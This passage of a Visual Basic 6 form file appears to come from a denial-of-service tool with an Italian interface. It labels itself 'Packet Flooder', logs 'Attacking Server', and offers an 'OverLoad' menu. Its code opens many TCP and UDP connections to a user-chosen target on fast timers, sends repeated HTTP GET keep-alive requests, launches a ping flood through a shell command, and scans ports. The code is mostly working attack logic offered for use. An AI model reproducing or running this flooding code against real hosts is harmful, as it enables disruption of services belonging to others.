            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   5640
         TabIndex        =   2
         Text            =   "Idle"
         Top             =   480
         Width           =   2175
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   360
         TabIndex        =   1
         Text            =   "Site.com/IP"
         Top             =   480
         Width           =   3735
      End
      Begin VB.Label Label23 
         AutoSize        =   -1  'True
         Caption         =   "------------>"
         Height          =   195
         Left            =   4560
         TabIndex        =   58
         Top             =   480
         Width           =   630
      End
   End
   Begin CoolXPButton.xpButton xpButton2 
      Height          =   255
      Left            =   6600
      TabIndex        =   60
      Top             =   8400
      Width           =   1455
      _ExtentX        =   2566
      _ExtentY        =   450
      Caption         =   "Stop"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Label Label24 
      AutoSize        =   -1  'True
      Caption         =   "Packet Flooder"
      Height          =   195
      Left            =   3240
      TabIndex        =   59
      Top             =   8400
      Width           =   1080
   End
   Begin VB.Label Label20 
      AutoSize        =   -1  'True
      Caption         =   "Sono Fermo"
      Height          =   195
      Left            =   1080
      TabIndex        =   53
      Top             =   9600
      Width           =   855
   End
   Begin VB.Label Label19 
      AutoSize        =   -1  'True
      Caption         =   "Stato:"
      Height          =   195
      Left            =   360
      TabIndex        =   52
      Top             =   9600
      Width           =   420
   End
   Begin VB.Label Label18 
      AutoSize        =   -1  'True
      Caption         =   "NONE"
      Height          =   195
      Left            =   6720
      TabIndex        =   51
      Top             =   9600
      Width           =   465
   End
   Begin VB.Line Line1 
      X1              =   0
      X2              =   8520
      Y1              =   9480
      Y2              =   9480
   End
   Begin VB.Image Image2 
      Height          =   900
      Left            =   600
      Picture         =   "Form1.frx":0000
      Stretch         =   -1  'True
      Top             =   120
      Width           =   7170
   End
   Begin VB.Menu pop 
      Caption         =   "Tools"
      Begin VB.Menu pop1 
         Caption         =   "OverLoad"
      End
      Begin VB.Menu pop2 
         Caption         =   "Esci"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim packet As Long
Dim Socket As Integer
Dim SocketUDP As Integer



Private Sub Slider1_Click()

End Sub

Private Sub Check1_Click()
If Check1.Value = 1 Then
Timer2.Enabled = True
Else
Timer2.Enabled = False

End If


End Sub

Private Sub pop1_Click()
Form2.Show

End Sub

Private Sub pop2_Click()
End

End Sub

Private Sub SD_Scroll()
If SD.Value = 1 Then
Timer3.Interval = 2000
End If
If SD.Value = 2 Then
Timer3.Interval = 1500
End If
If SD.Value = 3 Then
Timer3.Interval = 1300
End If
If SD.Value = 4 Then
Timer3.Interval = 1000
End If
If SD.Value = 5 Then
Timer3.Interval = 700
End If
If SD.Value = 6 Then
Timer3.Interval = 600
End If
If SD.Value = 7 Then
Timer3.Interval = 500
End If
If SD.Value = 8 Then
Timer3.Interval = 100
End If
If SD.Value = 9 Then
Timer3.Interval = 50
End If
If SD.Value = 10 Then
Timer3.Interval = 10
End If
End Sub

Private Sub Timer1_Timer()
On Error Resume Next

Winsock4.Close
Winsock4.RemotePort = Text7.Text
Winsock4.Connect Text1.Text
Text7.Text = Text7.Text + 1
If Text7.Text = Text8.Text Then
Timer1.Enabled = False
MsgBox "Scannerizzazione Terminata", vbExclamation
Timer1.Enabled = False
Text7.Enabled = True
xpButton16.Enabled = True
End If
Winsock4.Close

End Sub

Private Sub Timer2_Timer()
xpButton12_Click
End Sub

Private Sub Timer3_Timer()
Dim i As Integer

For i = 1 To Socket
Winsock1(i).Connect Text1.Text, Text9.Text
DoEvents
DoEvents
Winsock1(i).Close
Label14.Caption = Label14.Caption + 1
Next i









End Sub

Private Sub Timer4_Timer()
Winsock1(0).Connect Text1.Text, Text9.Text
Text6.Text = Text6.Text & "Attacking Server : " & "Sulla Porta " & Winsock1(0).RemotePort & vbCrLf



'GET /index.php HTTP/1.1 Host: 192.168.1.2
DoEvents
Label14.Caption = Label14.Caption + 1

Winsock1(0).Close

End Sub

Private Sub Timer5_Timer()
Dim i As Integer

For i = 1 To SocketUDP
Winsock3(i).Connect Text1.Text, Text10.Text
DoEvents
DoEvents
Winsock3(i).Close
Label15.Caption = Label15.Caption + 1
Next i
End Sub

Private Sub Timer7_Timer()
Label18.Caption = Now

End Sub

Private Sub TimerICMP_Timer()
Dim X As Integer
X = Ping(Text1.Text)
Label17.Caption = X

End Sub

Private Sub Winsock1_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Text6.Text = Text6.Text & "Server Morto o Errore" & vbCrLf

End Sub

Private Sub Winsock4_Connect()
List1.AddItem "La Porta " & Winsock4.RemotePort & " è Aperta"

End Sub

Private Sub Winsock4_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Winsock4.Close

End Sub

Private Sub WinsockIP_Connect()
Text2.Text = WinsockIP.RemoteHostIP
WinsockIP.Close
End Sub

Private Sub WinsockIP_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
MsgBox "Errore Impossibile Trovare L'indirizzo IP", vbCritical
WinsockIP.Close
End Sub

Private Sub WinsockPacket_Connect()
On Error Resume Next
 WinsockPacket.SendData "GET / HTTP/1.1" & vbCrLf & "Host: " & Text1 & vbCrLf & vbCrLf
 packet = packet + 1
 Label16.Caption = packet
End Sub

Private Sub WinsockPacket_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
WinsockPacket.SendData "GET / HTTP/1.1" & vbCrLf & "Host: " & Text1 & vbCrLf & "Connection: Keep-alive" & vbCrLf & "Keep-alive: 300" & vbCrLf & vbCrLf
 packet = packet + 1
 Label16.Caption = packet

End Sub

Private Sub xpButton1_Click()
WinsockIP.Connect Text1.Text, Text9.Text


End Sub

Private Sub xpButton10_Click()
Dim i As Integer

For i = 1 To Label4.Caption
Load Winsock3(i)
SocketUDP = SocketUDP + 1

Next i
If SocketUDP = Label4.Caption Then

Timer5.Enabled = True

End If

End Sub

Private Sub xpButton11_Click()
Timer5.Enabled = False
For i = 1 To Label4.Caption
Unload Winsock3(i)
SocketUDP = SocketUDP - 1
Next i


End Sub

Private Sub xpButton12_Click()
Shell ("ping " & Text1.Text & " -l " & Text3.Text & " -t" & Text4.Text)

End Sub

Private Sub xpButton13_Click()
Timer2.Interval = Text5.Text
End Sub

Private Sub xpButton14_Click()
TimerICMP.Enabled = True

End Sub

Private Sub xpButton15_Click()
TimerICMP.Enabled = False
End Sub

Private Sub xpButton16_Click()
Timer1.Enabled = True
Text7.Enabled = False
xpButton16.Enabled = False

End Sub

Private Sub xpButton17_Click()
Timer1.Enabled = False
Text7.Enabled = True
xpButton16.Enabled = True
Text7.Text = 0

End Sub

Private Sub xpButton18_Click()
Text7.Text = ""
Text8.Text = ""
List1.Clear

End Sub

Private Sub xpButton19_Click()
Form3.Show
End Sub

Private Sub xpButton2_Click()
WinsockPacket.Close

End Sub

Private Sub xpButton20_Click()
WinsockPacket.Connect Text1.Text, Text9.Text
End Sub

Private Sub xpButton4_Click()
Label2.Caption = Label2.Caption - 1

End Sub

Private Sub xpButton5_Click()
Label2.Caption = Label2.Caption + 1

End Sub

Private Sub xpButton6_Click()

Dim i As Integer

For i = 1 To Label2.Caption
Load Winsock1(i)
Socket = Socket + 1

Next i
If Socket = Label2.Caption Then

Timer3.Enabled = True
Timer4.Enabled = True

End If


End Sub

Private Sub xpButton7_Click()
Timer3.Enabled = False
For i = 1 To Label2.Caption
Unload Winsock1(i)
Socket = Socket - 1

Next i
Timer4.Enabled = False

End Sub

Private Sub xpButton8_Click()
Label4.Caption = Label4.Caption - 1

End Sub

Private Sub xpButton9_Click()
Label4.Caption = Label4.Caption + 1

End Sub
